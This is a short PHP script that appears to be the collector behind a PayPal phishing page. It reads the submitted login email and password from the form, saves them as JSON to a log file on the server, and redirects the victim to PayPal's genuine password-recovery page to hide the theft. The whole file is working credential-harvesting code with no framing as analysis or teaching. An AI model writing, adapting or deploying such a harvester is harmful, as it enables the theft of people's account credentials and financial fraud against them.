<?php

header('Location: https://www.paypal.com/authflow/password-recovery/');
$data = array('site' => 'Paypal',
  'user' => $_POST['login_email'],
  'pass' => $_POST['login_password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>